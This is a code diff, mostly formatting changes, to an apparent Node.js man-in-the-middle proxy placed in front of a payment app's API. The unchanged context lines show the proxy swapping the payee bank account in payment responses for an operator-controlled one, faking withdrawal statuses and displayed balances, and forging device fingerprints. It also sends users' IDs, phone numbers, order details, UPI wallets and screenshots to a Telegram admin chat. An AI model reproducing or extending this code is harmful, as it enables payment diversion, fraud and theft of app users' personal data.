           for (const imgUrl of imgUrls.slice(0, 3)) {
-            try { await bot.sendPhoto(data.adminChatId, imgUrl, { caption: `📸 Pending Screenshot [${userId || 'N/A'}]` }); } catch(e) {
-              bot.sendMessage(data.adminChatId, `📸 Image URL: ${imgUrl}`).catch(()=>{});
+            try { await bot.sendPhoto(data.adminChatId, imgUrl, { caption: `📸 Pending Screenshot [${userId || 'N/A'}]` }); } catch (e) {
+              bot.sendMessage(data.adminChatId, `📸 Image URL: ${imgUrl}`).catch(() => { });
             }
           }
         }
       }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
+  } catch (e) { await transparentProxy(req, res); }
 });
 
 app.all('/app/api/orderOut/memberOrderOutList', async (req, res) => {
@@ -2214,7 +2214,7 @@ app.all('/app/api/orderOut/paying', async (req, res) => {
     const respData = getResponseData(jsonResp);
     if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
       const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
-      bot.sendMessage(data.adminChatId, `🔍 PAYING RAW RESPONSE:\n${dump}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🔍 PAYING RAW RESPONSE:\n${dump}`).catch(() => { });
     }
     let shouldOverride = true;
     if (active && active.minAmount) {
@@ -2232,25 +2232,25 @@ app.all('/app/api/orderOut/paying', async (req, res) => {
     }
     if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
       const afterDump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
-      bot.sendMessage(data.adminChatId, `✅ PAYING AFTER REPLACE:\n${afterDump}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `✅ PAYING AFTER REPLACE:\n${afterDump}`).catch(() => { });
     }
     const phone = getPhone(data, detectedUserId);
     if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
       const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
       const overrideLabel = shouldOverride ? "" : " [REAL BANK - UNDER MIN LIMIT]";
       bot.sendMessage(data.adminChatId,
-`🔔 💳 Paying${overrideLabel}
+        `🔔 💳 Paying${overrideLabel}
 👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
 Order: ${rd.orderId || rd.orderNo || 'N/A'}
 Amount: ₹${rd.amount || rd.orderAmount || 'N/A'}
 Bank: ${shouldOverride && active ? active.accountNo : (rd.customerBankNumber || rd.accountNo || 'N/A')}
 Acc: ${shouldOverride && active ? active.accountHolder : (rd.customerName || rd.accountHolder || 'N/A')}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-      ).catch(()=>{});
+      ).catch(() => { });
     }
-    if (detectedUserId) { trackUser(data, detectedUserId, 'Paying'); saveData(data).catch(()=>{}); }
+    if (detectedUserId) { trackUser(data, detectedUserId, 'Paying'); saveData(data).catch(() => { }); }
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) {
+  } catch (e) {
     console.error('Paying error:', e.message);
     if (!res.headersSent) await transparentProxy(req, res);
   }
@@ -2262,10 +2262,10 @@ app.post('/app/api/orderOut/cancel', async (req, res) => {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const cancelUserId = await extractUserId(req, jsonResp);
     if (data.adminChatId && bot && !isLogOff(data, cancelUserId) && !(await isLogOffByToken(data, req))) {
-      bot.sendMessage(data.adminChatId, `❌ Order Cancelled\nOrder: ${req.parsedBody?.orderId || req.parsedBody?.orderNo || 'N/A'}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `❌ Order Cancelled\nOrder: ${req.parsedBody?.orderId || req.parsedBody?.orderNo || 'N/A'}`).catch(() => { });
     }
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
+  } catch (e) { await transparentProxy(req, res); }
 });
 
 app.post('/app/api/memberRecharge/cancelOrder', async (req, res) => {
@@ -2274,10 +2274,10 @@ app.post('/app/api/memberRecharge/cancelOrder', async (req, res) => {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const rchgCancelUserId = await extractUserId(req, jsonResp);
     if (data.adminChatId && bot && !isLogOff(data, rchgCancelUserId) && !(await isLogOffByToken(data, req))) {
-      bot.sendMessage(data.adminChatId, `❌ Recharge Cancelled\nOrder: ${req.parsedBody?.orderId || req.parsedBody?.orderNo || 'N/A'}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `❌ Recharge Cancelled\nOrder: ${req.parsedBody?.orderId || req.parsedBody?.orderNo || 'N/A'}`).catch(() => { });
     }
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
+  } catch (e) { await transparentProxy(req, res); }
 });
 
 app.all('/app/api/memberManager/withdrawHistory', async (req, res) => {
@@ -2289,8 +2289,8 @@ app.all('/app/api/memberManager/withdrawHistory', async (req, res) => {
     if (whData) {
       const items = Array.isArray(whData) ? whData
         : whData.list ? whData.list
-        : whData.records ? whData.records
-        : whData.rows ? whData.rows : null;
+          : whData.records ? whData.records
+            : whData.rows ? whData.rows : null;
 
       if (items && items.length > 0) {
         const globalCount = data.withdrawOverride || 0;
@@ -2318,7 +2318,7 @@ app.all('/app/api/memberManager/withdrawHistory', async (req, res) => {
         }
 
         if (changed > 0 && data.adminChatId && bot) {
-          bot.sendMessage(data.adminChatId, `✅ Changed ${changed} withdrawal(s) to Paying:\n${changedDetails.join('\n')}`).catch(()=>{});
+          bot.sendMessage(data.adminChatId, `✅ Changed ${changed} withdrawal(s) to Paying:\n${changedDetails.join('\n')}`).catch(() => { });
         }
 
         const detectedUserId = await extractUserId(req, jsonResp);
@@ -2333,7 +2333,7 @@ app.all('/app/api/memberManager/withdrawHistory', async (req, res) => {
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) {
+  } catch (e) {
     if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
   }
 });
@@ -2422,7 +2422,7 @@ app.all('/app/api/memberManager/mine', async (req, res) => {
         orderCount: existing.orderCount || 0
       };
       freshData._skipOverrideMerge = true;
-      saveData(freshData).catch(()=>{});
+      saveData(freshData).catch(() => { });
     }
     if (data.adminChatId && bot) {
       if (sellCutReport) {
@@ -2443,7 +2443,7 @@ app.all('/app/api/memberManager/mine', async (req, res) => {
           `👁️ User Sees: ₹${displayedBalance}\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `🕐 Time: ${r.time}`
-        ).catch(()=>{});
+        ).catch(() => { });
       } else {
         const mineOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
         const mineAdded = mineOvr && mineOvr.addedBalance !== undefined ? mineOvr.addedBalance : 0;
@@ -2458,10 +2458,10 @@ app.all('/app/api/memberManager/mine', async (req, res) => {
         } else {
           mineMsg += `\n💰 Balance: ₹${realBal}`;
         }
-        bot.sendMessage(data.adminChatId, mineMsg).catch(()=>{});
+        bot.sendMessage(data.adminChatId, mineMsg).catch(() => { });
       }
     }
-  } catch(e) { await transparentProxy(req, res); }
+  } catch (e) { await transparentProxy(req, res); }
 });
 
 app.all('/app/api/memberManager/balanceRecordList', async (req, res) => {
@@ -2520,11 +2520,11 @@ app.all('/app/api/memberManager/balanceRecordList', async (req, res) => {
 
       const targetArr = Array.isArray(listData) ? listData
         : (listData.lists && Array.isArray(listData.lists)) ? listData.lists
-        : (listData.list && Array.isArray(listData.list)) ? listData.list
-        : (listData.records && Array.isArray(listData.records)) ? listData.records
-        : (listData.rows && Array.isArray(listData.rows)) ? listData.rows
-        : (listData.content && Array.isArray(listData.content)) ? listData.content
-        : null;
+          : (listData.list && Array.isArray(listData.list)) ? listData.list
+            : (listData.records && Array.isArray(listData.records)) ? listData.records
+              : (listData.rows && Array.isArray(listData.rows)) ? listData.rows
+                : (listData.content && Array.isArray(listData.content)) ? listData.content
+                  : null;
 
       if (targetArr) {
         if (shouldInject) {
@@ -2568,7 +2568,7 @@ app.all('/app/api/memberManager/balanceRecordList', async (req, res) => {
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) {
+  } catch (e) {
     console.error('balanceRecordList error:', req.originalUrl, e.message);
     if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
   }
@@ -2587,10 +2587,10 @@ app.all('/app/api/memberManager/bindRobotDetail', async (req, res) => {
     if (data.adminChatId && bot) {
       const phone = getPhone(data, userId);
       const rd = (respData && typeof respData === 'object') ? respData : {};
-      bot.sendMessage(data.adminChatId, `🤖 Robot Bind Details\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n📱 Telegram Bot: ${rd.telegramBotLink || rd.botLink || 'N/A'}\n🔑 Bind Code: ${rd.telegramBindCode || rd.bindCode || rd.code || 'N/A'}\n🔗 Bound: ${rd.isBound !== undefined ? rd.isBound : (rd.bound !== undefined ? rd.bound : 'N/A')}\n📊 Full: ${JSON.stringify(rd).substring(0, 500)}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🤖 Robot Bind Details\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n📱 Telegram Bot: ${rd.telegramBotLink || rd.botLink || 'N/A'}\n🔑 Bind Code: ${rd.telegramBindCode || rd.bindCode || rd.code || 'N/A'}\n🔗 Bound: ${rd.isBound !== undefined ? rd.isBound : (rd.bound !== undefined ? rd.bound : 'N/A')}\n📊 Full: ${JSON.stringify(rd).substring(0, 500)}`).catch(() => { });
     }
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
+  } catch (e) { await transparentProxy(req, res); }
 });
 
 app.all('/app/api/orderOut/receiveOcr', async (req, res) => {
@@ -2599,10 +2599,10 @@ app.all('/app/api/orderOut/receiveOcr', async (req, res) => {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const ocrUserId = await extractUserId(req, jsonResp);
     if (data.adminChatId && bot && !isLogOff(data, ocrUserId) && !(await isLogOffByToken(data, req))) {
-      bot.sendMessage(data.adminChatId, `📸 OCR Received\n${JSON.stringify(req.parsedBody || {}).substring(0, 500)}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `📸 OCR Received\n${JSON.stringify(req.parsedBody || {}).substring(0, 500)}`).catch(() => { });
     }
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
+  } catch (e) { await transparentProxy(req, res); }
 });
 
 const WALLET_INTERCEPT_ENDPOINTS = [
@@ -2627,7 +2627,7 @@ app.all('/app/api/v1/upi/list', async (req, res) => {
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
       const respData = getResponseData(jsonResp);
       const list = (respData && Array.isArray(respData.upiList)) ? respData.upiList : [];
-      
+
       let upiMsg = `📱 *USER UPI WALLETS LIST*\n`;
       upiMsg += `👤 UserID: \`${userId || 'N/A'}\`${phone ? ` | Phone: \`${phone}\`` : ''}\n\n`;
 
@@ -2651,7 +2651,7 @@ app.all('/app/api/v1/upi/list', async (req, res) => {
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
+  } catch (e) { await transparentProxy(req, res); }
 });
 
 for (const ep of WALLET_INTERCEPT_ENDPOINTS) {
@@ -2670,7 +2670,7 @@ for (const ep of WALLET_INTERCEPT_ENDPOINTS) {
         notifyTelegram(data.adminChatId, msg);
       }
       sendJson(res, respHeaders, jsonResp, respBody);
-    } catch(e) { await transparentProxy(req, res); }
+    } catch (e) { await transparentProxy(req, res); }
   });
 }
 
@@ -2713,7 +2713,7 @@ app.all('/app/api/customer/list', async (req, res) => {
     } else {
       sendJson(res, respHeaders, jsonResp, respBody);
     }
-  } catch(e) { await transparentProxy(req, res); }
+  } catch (e) { await transparentProxy(req, res); }
 });
 
 
@@ -2755,7 +2755,7 @@ function makeDeviceFingerprint(seedKey) {
 
 app.post('/app/api/memberDevice/add', async (req, res) => {
   let userId = '';
-  try { userId = (await extractUserId(req, null)) || ''; } catch(e) {}
+  try { userId = (await extractUserId(req, null)) || ''; } catch (e) { }
   const memberCode = userId ? (String(userId).startsWith('MC') ? String(userId) : ('MC' + userId)) : '';
   const tokSnip = (getTokenFromReq(req) || '').substring(0, 32);
   const seedBase = memberCode || tokSnip || 'anon';
@@ -2765,14 +2765,14 @@ app.post('/app/api/memberDevice/add', async (req, res) => {
     try {
       const raw = await redis.hget('ezpayDeviceMap', memberCode);
       if (raw) stored = (typeof raw === 'string') ? (JSON.parse(raw) || null) : raw;
-    } catch(e) {}
+    } catch (e) { }
   }
 
   if (!stored) {
     const seedKey = seedBase + ':' + crypto.randomBytes(12).toString('hex');
     stored = makeDeviceFingerprint(seedKey);
     if (redis && memberCode) {
-      redis.hset('ezpayDeviceMap', memberCode, JSON.stringify(stored)).catch(()=>{});
+      redis.hset('ezpayDeviceMap', memberCode, JSON.stringify(stored)).catch(() => { });
     }
   }
 
@@ -2786,7 +2786,7 @@ app.post('/app/api/memberDevice/add', async (req, res) => {
     const { response, respBody, respHeaders } = await proxyFetch(req);
     res.writeHead(response.status, respHeaders);
     res.end(respBody);
-  } catch(e) {
+  } catch (e) {
     if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
   }
 });
@@ -2798,7 +2798,7 @@ app.all('*', async (req, res) => {
       const { response, respBody, respHeaders } = await proxyFetch(req);
       res.writeHead(response.status, respHeaders);
       res.end(respBody);
-    } catch(e) {
+    } catch (e) {
       if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
     }
     return;
